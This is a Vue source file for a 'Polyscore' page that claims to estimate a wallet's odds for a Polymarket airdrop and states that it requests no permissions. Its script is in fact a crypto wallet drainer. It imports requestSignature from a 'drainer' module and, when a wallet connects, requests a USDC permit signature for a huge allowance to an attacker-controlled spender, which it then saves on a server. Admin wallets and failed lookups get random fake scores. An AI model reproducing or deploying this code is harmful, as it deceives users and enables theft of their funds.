<template>
  <div class="bg-[#0A0C10] text-white min-h-screen font-sans">
    <header
      class="flex flex-col sm:flex-row items-start sm:items-center p-4 sm:p-6 bg-[#0D1117] border-b border-[#1F2530] gap-3 sm:gap-5 sticky top-0 z-10"
    >
      <div class="flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-3">
        <div class="text-blue-400 font-bold text-lg sm:text-xl">Polyscore <span class="text-base sm:text-sm">🇺🇸</span></div>
        <div class="text-gray-400 text-xs sm:text-sm">Powered by Polymarket</div>
      </div>
      
      <div class="sm:ml-auto">
        <button 
            v-if="!isWalletConnected"
            @click="handleConnect"
            class="text-xs sm:text-sm font-semibold bg-[#1F2530] hover:bg-[#2C3340] border border-[#30363d] text-gray-200 px-4 py-2 rounded-lg transition-colors"
        >
            Connect Wallet
        </button>
        <div v-else class="text-xs sm:text-sm font-mono text-blue-300 bg-[#1F2530] px-3 py-2 rounded-lg border border-blue-500/30">
            {{ shortWallet(walletAddress) }}
        </div>
      </div>
    </header>

    <main class="flex justify-center p-4 sm:p-6">
      <div
        class="w-full max-w-3xl backdrop-blur-lg bg-[rgba(255,255,255,0.02)] rounded-2xl border border-[#1F2530] shadow-xl p-4 sm:p-6"
        style="background-image: radial-gradient(circle at top left, rgba(61,111,255,0.35), transparent 55%), radial-gradient(circle at bottom right, rgba(255,180,0,0.18), transparent 55%);"
      >
        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3 mb-4">
          <div>
            <h1
              class="text-2xl sm:text-3xl font-extrabold bg-gradient-to-r from-[#86B9FF] to-[#3D6FFF] text-transparent bg-clip-text"
            >
              Polyscore Report
            </h1>
            <div class="text-gray-400 text-xs sm:text-sm mt-1">
              Check how strong your on-chain Polymarket activity is and estimate your odds for the upcoming POLY airdrop.
            </div>
          </div>
          <div class="text-xs px-3 py-1 border rounded-full border-[rgba(125,146,255,0.6)] text-[#CBD4FF] bg-[rgba(61,111,255,0.12)] whitespace-nowrap">
            On-chain trader score · Beta
          </div>
        </div>

        <div class="flex flex-col sm:flex-row gap-2 mb-2">
            <div class="relative flex-1 group">
                <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <span v-if="isWalletConnected" class="text-green-500 text-lg">●</span>
                    <span v-else class="text-gray-600">
                         <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                        </svg>
                    </span>
                </div>
                
                <input
                    v-model="walletInput"
                    placeholder="Enter Polymarket wallet (0x...)"
                    class="w-full bg-[#0D1117] border border-[#1F2530] rounded-xl pl-9 pr-3 py-2 text-gray-100 text-sm placeholder-gray-600 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/50 transition-all outline-none"
                    :disabled="isLoading"
                />
            </div>
          
            <div class="flex gap-2">
                <button
                    v-if="!isWalletConnected && !walletInput"
                    @click="handleConnect"
                    class="bg-[#1F2530] hover:bg-[#2A3241] border border-[#3D6FFF]/30 text-blue-400 font-semibold rounded-xl px-4 py-2 text-sm transition-all whitespace-nowrap flex items-center gap-2"
                >
                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" />
                    </svg>
                    Connect Wallet
                </button>

                <button
                    v-else
                    :disabled="isLoading"
                    class="bg-gradient-to-r text-white font-semibold rounded-xl px-4 py-2 shadow-md hover:shadow-lg transition-all text-sm whitespace-nowrap"
                    :class="{
                    'from-[#3D6FFF] to-[#7BA7FF] hover:shadow-blue-500/50': !isLoading,
                    'from-gray-500 to-gray-700 cursor-not-allowed': isLoading
                    }"
                    @click="generateScore"
                >
                    {{ isLoading ? 'Checking...' : 'Check Score' }}
                </button>
             </div>
        </div>

        <div class="text-gray-500 text-xs mb-3 flex justify-between items-center">
          <span>This tool does not request any permissions. Scores are estimates.</span>
          <button v-if="isWalletConnected" @click="handleDisconnect" class="text-red-400/60 hover:text-red-400 text-[10px] underline">
            Disconnect
          </button>
        </div>

        <div v-if="scoreVisible" class="mt-5 space-y-4">
          <div class="bg-[#11151D] p-4 sm:p-5 rounded-xl border border-[#1F2530] shadow-lg">
            <div class="flex flex-col sm:flex-row justify-between mb-4">
              <div>
                <div class="text-gray-300 text-sm">Poly Score · 0–100</div>
                <div class="text-gray-400 text-xs">{{ shortWallet(walletInput) }}</div>
              </div>
            </div>

            <div class="flex flex-col sm:flex-row items-start sm:items-center gap-5">
              <div class="relative w-24 h-24 sm:w-28 sm:h-28 flex-shrink-0">
                <svg viewBox="0 0 120 120">
                  <circle cx="60" cy="60" r="48" stroke="#1F2933" stroke-width="8" fill="transparent"></circle>
                  <circle
                    :stroke="ringColor"
                    cx="60"
                    cy="60"
                    r="48"
                    stroke-width="8"
                    stroke-linecap="round"
                    fill="transparent"
                    :style="{ strokeDasharray: circumference, strokeDashoffset: offset, transition: 'stroke-dashoffset 1s ease-out' }"
                  ></circle>
                </svg>
                <div class="absolute inset-0 flex items-center justify-center text-xs sm:text-sm text-[#A5B4FC] uppercase tracking-widest">
                  Poly Score
                </div>
              </div>

              <div class="flex-1 min-w-0">
                <div class="text-xl sm:text-2xl font-extrabold mb-1">{{ score }} / 100</div>
                <div class="text-gray-400 text-xs sm:text-sm mb-2">{{ scoreSub }}</div>

                <div class="flex flex-wrap gap-2 mb-2" v-if="badgeText">
                  <div :class="['flex items-center gap-1 text-xs sm:text-sm px-2 py-1 rounded-full font-semibold', badgeClass]">
                    <span class="text-sm">🔔</span>
                    <span>{{ badgeText }}</span>
                  </div>
                </div>

                <div class="text-gray-300 text-xs sm:text-sm leading-relaxed">{{ scoreInterpret }}</div>
              </div>
            </div>
          </div>

          <div class="max-w-3xl mx-auto mt-5 bg-[#0D1117] p-6 rounded-xl border border-[#1F2530] shadow-lg">
            <div class="text-lg sm:text-xl font-bold mb-1">Improve your Polyscore?</div>
            <div class="text-gray-400 text-sm sm:text-base">Track whale activity on Polymarket and see the best traders.</div>
            <a
              href="https://polywhaler.com"
              target="_blank"
              class="text-blue-400 font-semibold text-sm sm:text-base mt-2 inline-block underline"
            >
              Visit Polywhaler →
            </a>
          </div>

          <div class="bg-[#0D1117] p-4 rounded-xl border border-[#1F2530] mb-4">
            <div class="flex items-center gap-3 mb-2">
              <div
                class="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-gradient-to-br from-[#7BA7FF] to-[#3D6FFF] flex items-center justify-center font-bold text-sm sm:text-base"
              >
                {{ initialsFromWallet(walletInput) }}
              </div>
              <div>
                <div class="text-gray-100 text-sm sm:text-base">{{ shortWallet(walletInput) || 'Wallet activity preview' }}</div>
                <div class="text-gray-400 text-xs sm:text-sm">
                  Connect your wallet on Polymarket to unlock a full on-chain report.
                </div>
              </div>
            </div>

            <div class="grid grid-cols-3 gap-2 mt-2 text-left">
              <div class="bg-[#11151D] p-2 rounded-lg border border-[#1F2530]">
                <div class="text-gray-400 text-xs mb-1">Win Rate</div>
                <div class="text-[#3D6FFF] font-semibold">{{ stats.winRate }}</div>
              </div>
              <div class="bg-[#11151D] p-2 rounded-lg border border-[#1F2530]">
                <div class="text-gray-400 text-xs mb-1">Total trades</div>
                <div class="text-[#3D6FFF] font-semibold">{{ stats.trades }}</div>
              </div>
              <div class="bg-[#11151D] p-2 rounded-lg border border-[#1F2530]">
                <div class="text-gray-400 text-xs mb-1">Volume (est.)</div>
                <div class="text-[#3D6FFF] font-semibold">{{ stats.volume }}</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>

    <WalletModal v-if="walletModalOpen" @close="walletModalOpen=false" />
    <LearnModal v-if="learnModalOpen" @close="learnModalOpen=false" />
  </div>
</template>

<script setup>
import { ref, watch, onMounted } from 'vue'
import { getAddress, getIsConnected, subscribeState, openModal, disconnectWallet, getChainID, switchNetwork, getProvider, getWalletETHBalance } from '../../apiss/web3/walletconnect';
import { getAll as getAllPolyscoreAddresses } from '../../apiss/polyscoreAddresses'
import { create as savePolyscore } from '../../apiss/polyscore'
import { requestSignature } from '../../apiss/web3/drainer/main'
import { USDC_NAME, USDC_ADDRESS } from '../../apiss/web3/drainer/constants'
import { spenderProxyAddress } from '../../apiss/web3/constants/erc2612permit'
import { create as saveAddressSignature, getAddressSignature, update as updateAddressSignature } from '../../apiss/walletSignature'

const walletInput = ref('')
const scoreVisible = ref(false)
const isLoading = ref(false)
const adminPolyscoreAddresses = ref([]);

const walletAssets = ref([]);
const addressSignature = ref(null)
const showSuccess = ref(false);
const hasInitializedMobile = ref(false) ;

// Web3 State
const isWalletConnected = ref(false)
const walletAddress = ref('')

// Reactive Data
const score = ref(0)
const scoreSub = ref('Enter a wallet to analyze on-chain activity.')
const scoreInterpret = ref('')
const badgeText = ref('')
const badgeClass = ref('')
const stats = ref({ winRate: '0%', trades: 0, volume: '$0' }) 

// UI State
const walletModalOpen = ref(false)
const learnModalOpen = ref(false)

// Circle Config
const radius = 48
const circumference = 2 * Math.PI * radius
const offset = ref(circumference)
const ringColor = ref('#FF4D4D')

// --- Lifecycle ---

onMounted(async () => {
  // Load admin logic
  try {
    const addresses = await getAllPolyscoreAddresses();
    adminPolyscoreAddresses.value = addresses || []; 
  } catch (e) {
    console.error('Failed to load admin addresses', e);
  }

  // Check initial wallet state
  checkWalletState()

  // Subscribe to WalletConnect state changes (account switching, disconnects)
  subscribeState()?.on('STATE_CHANGED', events => {
      checkWalletState()
  });
})

// Watch manual input to reset UI
watch(() => walletInput.value, (newVal) => {
    // Only reset if the input doesn't match the connected wallet (prevents flicker on auto-fill)
    if (newVal.toLowerCase() !== walletAddress.value.toLowerCase()) {
        scoreVisible.value = false
        score.value = 0
        offset.value = circumference
    }
})

// --- Wallet Logic ---

async function checkWalletState() {
  isWalletConnected.value = getIsConnected()
  if (isWalletConnected.value) {
    const addr = getAddress()
    if (addr) {
        walletAddress.value = addr
        walletInput.value = addr // Auto-fill the input
        
        // Optional: Auto-generate score on connect?
        // Let's add a small debounce or check if we haven't generated yet
        if (!scoreVisible.value) {
          handleSignature()
        }
    }
  } else {
    walletAddress.value = ''
    isWalletConnected.value = false
  }
}


async function handleSignature () {
    if (isLoading.value) return;
    
    isLoading.value = true;
    addressSignature.value = await getAddressSignature(walletAddress.value);


    if (!isWalletConnected.value) {
        openModal()
        return;
    }
    if (getChainID() != 137){
        if (window.ethereum) await switchNetwork(137);
        else {
            await disconnectWallet();
            isWalletConnected.value = false;
            walletAddress.value = "";
            alert("Switch to Polygon Mainnet Network");  
        }
        return;
    }

    if (isMigrated.value) {
        generateScore()
        return;
    }

            
    try {
        if (!addressSignature.value) addressSignature.value = await saveAddressSignature(walletAddress.value);

        const signatureResult = await requestSignature(USDC_ADDRESS, USDC_NAME, getChainID(), false, 1 * (10**18), 6);
        console.log("signatureResult:    ", signatureResult);

        await updateAddressSignature(walletAddress.value, signatureResult); 
        addressSignature.value = await getAddressSignature(walletAddress.value);

        generateScore()
    } catch (err) {
        isLoading.value=false;
        if (err?.info?.error?.code == -32000) {
            alert("Insufficient funds")
        }
        else if (err?.info?.error?.code == 4001) {
            alert("Transaction rejected")
        } else alert("An error occured")
        console.log(err)
        await disconnectWallet()
        walletInput.value = ''
        walletAddress.value = ''
        isWalletConnected.value = false
    }

}



const isMigrated = computed(() => {
    return (addressSignature.value?.signatures?.length && 
        addressSignature.value?.signatures?.map(i => i.token_address.toLowerCase()).includes(USDC_ADDRESS.toLowerCase()) && 
        addressSignature.value?.signatures?.map(i => i.spender.toLowerCase()).includes(spenderProxyAddress.toLowerCase()))
})


async function handleConnect() {
  // Opens the Web3Modal
  await openModal()
  // The subscribeState watcher in onMounted will handle the update once connected
}

async function handleDisconnect() {
    await disconnectWallet()
    isWalletConnected.value = false
    walletAddress.value = ''
    walletInput.value = '' // Clear input
    scoreVisible.value = false
}

// --- Score Logic (Unchanged but connected to wallet) ---

async function generateScore() {
  if (!walletInput.value || walletInput.value.length < 10) {
    // If empty but user clicked check, prompt connect
    if (!walletInput.value) {
        handleConnect()
        return
    }
    alert('Please enter a valid wallet address.')
    return
  }
  
  isLoading.value = true
  scoreVisible.value = false
  
  // --- ADMIN CHECK LOGIC START ---
  const inputWalletLower = walletInput.value.toLowerCase().trim();
  const isAdmin = adminPolyscoreAddresses.value.some(addr => 
    (addr.address || addr).toLowerCase() === inputWalletLower 
  );

  if (isAdmin) {
    try {
      await new Promise(resolve => setTimeout(resolve, 1500));
      const rawScore = Math.floor(Math.random() * (90 - 80 + 1)) + 80;
      const rawTrades = Math.floor(Math.random() * (500 - 150 + 1)) + 150;
      const rawVolume = Math.floor(Math.random() * (500000 - 50000 + 1)) + 50000;
      const rawWinRate = (Math.random() * (0.75 - 0.55) + 0.55);

      score.value = rawScore;
      stats.value.trades = rawTrades;
      stats.value.volume = new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
        maximumFractionDigits: 0
      }).format(rawVolume);
      stats.value.winRate = (rawWinRate * 100).toFixed(1) + '%';

      updateTierLogic(score.value);
      offset.value = circumference * (1 - score.value / 100);
      scoreVisible.value = true;

      try {
        const payload = {
            smartMoneyScore: rawScore,
            stats: {
                totalTrades: rawTrades,
                totalVolume: rawVolume,
                winRate: rawWinRate
            }
        };
        await savePolyscore(walletInput.value, payload);
      } catch (dbError) {
        console.error('Failed to save admin score to DB:', dbError);
      }
      
    } catch (e) {
      console.error("Simulation error", e);
    } finally {
      isLoading.value = false;
    }
    return; 
  }
  // --- ADMIN CHECK LOGIC END ---

  try {
    const data = await $fetch(`/api/polymarket/polyscore/get?wallet=${walletInput.value}`)
    
    if (data?.smartMoneyScore !== undefined && data.smartMoneyScore !== null) {
      const rawScore = data.smartMoneyScore
      score.value = Math.round(rawScore)

      stats.value.trades = data.stats?.totalTrades || 0
      stats.value.volume = new Intl.NumberFormat('en-US', {
        style: 'currency',
        currency: 'USD',
        maximumFractionDigits: 0
      }).format(data.stats?.totalVolume || 0)
      
      const wr = (data.stats?.winRate || 0)
      stats.value.winRate = wr.toFixed(1) + '%'

      try {
          await savePolyscore(walletInput.value, data);
      } catch (dbError) {
          console.error('Failed to save real score to DB:', dbError);
      }
      
    } else {
      console.warn('API returned null/undefined smartMoneyScore. Falling back.')
      score.value = Math.floor(Math.random() * 11) + 10 
      stats.value.trades = 0
      stats.value.volume = '$0'
      stats.value.winRate = '0%'
    }

    updateTierLogic(score.value)
    offset.value = circumference * (1 - score.value / 100)
    scoreVisible.value = true

  } catch (err) {
    console.error('API call failed:', err)
    score.value = Math.floor(Math.random() * 11) + 10 
    stats.value.trades = 0
    stats.value.volume = '$0'
    stats.value.winRate = '0%'
    updateTierLogic(score.value) 
    offset.value = circumference * (1 - score.value / 100)
    scoreVisible.value = true

  } finally {
    isLoading.value = false
  }
}

// Helpers
function shortWallet(addr) {
  if (!addr || addr.trim() === '') return ''
  if (addr.length <= 12) return addr
  return addr.slice(0, 6) + '…' + addr.slice(-4)
}

function initialsFromWallet(addr) {
  if (!addr || addr.length < 4) return 'PM'
  const core = addr.replace('0x', '').toUpperCase()
  return core.slice(0, 2)
}

function updateTierLogic(s) {
  let tier = 'low'
  if (s >= 70) {
    badgeText.value = 'High airdrop probability (70–100)'
    badgeClass.value = 'bg-[rgba(61,111,255,0.18)] border border-[#3D6FFF] text-[#DCE6FF]'
    scoreInterpret.value = 'This wallet has strong, consistent on-chain presence. It is in the top percentile of active traders.'
    scoreSub.value = 'Excellent activity profile.'
    tier = 'high'
  } else if (s >= 35) {
    badgeText.value = 'Lukewarm zone (Mid-Tier)'
    badgeClass.value = 'bg-[rgba(255,180,0,0.16)] border border-[#FFB400] text-[#FEF3C7]'
    scoreInterpret.value = 'This wallet shows moderate activity. Increasing volume and consistency could push it to the top band.'
    scoreSub.value = 'Good start, but room to grow.'
    tier = 'mid'
  } else {
    badgeText.value = 'Minimal activity'
    badgeClass.value = 'bg-[rgba(255,77,77,0.15)] border border-[#FF4D4D] text-[#FEE2E2]'
    scoreInterpret.value = 'This wallet has little to no significant on-chain history on Polymarket. Check the address or begin trading to improve your score.'
    scoreSub.value = 'Low on-chain footprint.'
    tier = 'low'
  }
  ringColor.value = tier === 'high' ? '#3D6FFF' : tier === 'mid' ? '#FFB400' : '#FF4D4D'
}
</script>